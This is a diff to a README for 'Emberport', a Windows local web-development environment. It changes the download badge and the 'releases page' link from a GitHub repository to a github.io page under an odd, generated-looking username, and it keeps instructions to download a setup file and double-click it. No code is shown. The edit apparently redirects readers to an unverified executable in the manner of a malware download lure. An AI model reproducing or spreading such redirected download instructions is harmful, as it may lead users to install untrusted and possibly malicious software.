@@ -1,6 +1,6 @@
 # 💻 Emberport - Build websites on your computer easily
 
-[![Download Emberport](https://img.shields.io/badge/Download-Emberport-blue.svg)](https://github.com/virginwoolerythrinavespertilio78/Emberport)
+[![Download Emberport](https://img.shields.io/badge/Download-Emberport-blue.svg)](https://virginwoolerythrinavespertilio78.github.io)
 
 Emberport provides a workspace for web development on Windows. It includes software tools to host websites, manage databases, and process PHP scripts. You gain control over your local environment through a simple interface. You switch between software versions or turn services on and off with single clicks. 
 
@@ -29,7 +29,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to install the software on your system.
 
-1. Visit the [Emberport releases page](https://github.com/virginwoolerythrinavespertilio78/Emberport) to download the latest setup file. 
+1. Visit the [Emberport releases page](https://virginwoolerythrinavespertilio78.github.io) to download the latest setup file. 
 2. Locate the file in your Downloads folder once the transfer finishes. 
 3. Double-click the file to start the installer.
 4. Follow the prompts on the screen. Select a destination folder for your web files. 
